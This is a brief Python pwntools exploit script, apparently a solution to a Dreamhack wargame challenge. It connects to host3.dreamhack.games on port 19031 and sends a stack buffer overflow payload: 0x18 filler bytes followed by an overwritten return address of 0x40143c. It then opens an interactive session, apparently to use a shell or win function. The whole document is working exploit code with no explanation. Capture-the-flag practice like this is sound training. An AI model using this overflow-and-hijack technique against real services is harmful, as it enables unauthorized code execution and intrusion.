from pwn import *

r = remote('host3.dreamhack.games', 19031)

payload = b'A' * 0x18
payload += p64(0x40143c)

r.sendafter("Input: ", payload)
r.interactive()